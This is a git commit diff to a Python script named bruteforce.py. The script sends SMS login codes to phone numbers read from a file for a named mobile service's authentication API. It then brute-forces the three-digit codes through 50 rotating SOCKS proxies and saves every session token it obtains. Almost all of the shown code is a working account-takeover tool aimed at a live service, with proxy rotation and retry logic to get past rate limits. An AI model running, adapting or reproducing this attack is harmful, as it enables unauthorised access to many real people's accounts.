165fe9b84af0760e49edeff676bdf976f90b19bb
Vitaliy <v.izhakivskiy@gmail.com>
2024-11-05 20:32:43 +0200

    fix

--- examples/bruteforce.py
+++ examples/bruteforce.py
@@ -2,6 +2,7 @@ import asyncio
 import random
 import socket
 import ssl
+import time
 
 from aiosocket.async_socket import AIOSocket
 from aiosocket.http import read_http_response
@@ -9,8 +10,9 @@ from aiosocket.http import read_http_response
 
 class OK(Exception):
 
-    def __init__(self, res):
+    def __init__(self, res, code):
         self.res = res
+        self.code = code
 
 
 HOST = "uployal.io"
@@ -22,15 +24,15 @@ def craft_request(phone_number: str, code: str):
     data = '{"mobile_phone": "' + phone_number + '",  "password": "' + code + '"}'
     content_len = len(data)
     headers = (
-        "Host: uployal.io\r\n"
-        "Content-Type: application/json\r\n"
-        "Content-Length: " + str(content_len) + "\r\n"
-        "X-APPLICATION-ID: e81d5b756\r\n"
-        "User-Agent: okhttp/4.12.0\r\n"
-        "\r\n"
+            "Host: uployal.io\r\n"
+            "Content-Type: application/json\r\n"
+            "Content-Length: " + str(content_len) + "\r\n"
+                                                    "X-APPLICATION-ID: e81d5b756\r\n"
+                                                    "User-Agent: okhttp/4.12.0\r\n"
+                                                    "\r\n"
     )
     return (
-        "POST /api/mobile/v2/consumer/auth/token/ HTTP/1.1\r\n" + headers + data
+            "POST /api/mobile/v2/consumer/auth/token/ HTTP/1.1\r\n" + headers + data
     ).encode()
 
 
@@ -38,15 +40,15 @@ def craft_send_code_request(phone: str):
     data = '{"mobile_phone": "' + phone + '"}'
     content_len = len(data)
     headers = (
-        "Host: uployal.io\r\n"
-        "Content-Type: application/json\r\n"
-        "Content-Length: " + str(content_len) + "\r\n"
-        "X-APPLICATION-ID: e81d5b756\r\n"
-        "User-Agent: okhttp/4.12.0\r\n"
-        "\r\n"
+            "Host: uployal.io\r\n"
+            "Content-Type: application/json\r\n"
+            "Content-Length: " + str(content_len) + "\r\n"
+                                                    "X-APPLICATION-ID: e81d5b756\r\n"
+                                                    "User-Agent: okhttp/4.12.0\r\n"
+                                                    "\r\n"
     )
     return (
-        "POST /api/mobile/v2.1/consumer/auth/code/ HTTP/1.1\r\n" + headers + data
+            "POST /api/mobile/v2.1/consumer/auth/code/ HTTP/1.1\r\n" + headers + data
     ).encode()
 
 
@@ -60,41 +62,34 @@ async def send_auth_code(phone: str, proxy):
     return res
 
 
-async def bruteforce_worker(phone, range_, proxy):
-    async_sock = await AIOSocket.open_connection(
-        ADDR, ssl_context=SSL_CONTEXT, server_hostname=HOST, socks5_addr=proxy
-    )
-    async_sock.set_timeout(15)
-    requests_sent = 0
-
-    for code in range_:
-        code_str = f"{code:03d}"
-
-        if requests_sent == 100:
-            for i in range(100):
-                res = await read_http_response(async_sock)
-                if res.status_code == 200:
-                    raise OK(res=res)
-            async_sock = await AIOSocket.open_connection(
-                ADDR,
-                ssl_context=SSL_CONTEXT,
-                server_hostname=HOST,
-                socks5_addr=proxy,
-            )
-            async_sock.set_timeout(15)
-            requests_sent = 0
-
-        request = craft_request(phone, code_str)
+async def check_one(phone, code, proxy):
+    try:
+        async_sock = await AIOSocket.open_connection(
+            ADDR, ssl_context=SSL_CONTEXT, server_hostname=HOST, socks5_addr=proxy
+        )
+        async_sock.set_timeout(50)
+        request = craft_request(phone, code)
         await async_sock.send(request)
-        requests_sent += 1
+        response = await read_http_response(async_sock)
+        return response
+    except Exception as e:
+        print("Exception while checking one: " + str(e))
+        return await check_one(phone, code, proxy)
 
-        print(proxy, code_str)
-    if requests_sent:
-        print("waiting for response")
-        for i in range(requests_sent):
-            res = await read_http_response(async_sock)
-            if res.status_code == 200:
-                raise OK(res=res)
+
+async def proxy_checks_codes(phone, proxy, codes):
+    for code in codes:
+        result = await check_one(phone, code, proxy)
+        print(code, result.status_code)
+        if result.status_code == 200:
+            raise OK(res=result, code=code)
+        await asyncio.sleep(1)
+
+
+async def bruteforce_worker(phone, range_, proxy):
+    codes = [f"{code:03d}" for code in range_]
+    results = await proxy_checks_codes(phone, proxy, codes)
+    return results
 
 
 async def bruteforce(phone, proxies):
@@ -118,17 +113,28 @@ async def bruteforce(phone, proxies):
         return e.res
 
 
+def read_numbers():
+    with open('numbers.txt', 'r') as f:
+        numbers = f.read().split('\n')
+        if '' in numbers:
+            numbers.remove('')
+        return numbers
+
+
 async def main():
     proxies = [("127.0.0.1", 9053 + i) for i in range(50)]
 
-    try:
-        phone = "+38(099)376-17-32"
-        res = await send_auth_code(phone, random.choice(proxies))
-        if res.status_code == 200:
-            result = await bruteforce(phone, proxies)
-            print("result", result)
-    except Exception as e:
-        print("Error checking number", e)
+    for phone in read_numbers():
+        try:
+            res = await send_auth_code(phone, random.choice(proxies))
+            if res.status_code == 200:
+                result = await bruteforce(phone, proxies)
+                token = result.json()['results']['token']
+                print('token', token)
+                with open("token.txt", "a") as f:
+                    f.write(f'{token}\n')
+        except Exception as e:
+            print("Error checking number", e)
 
 
 if __name__ == "__main__":
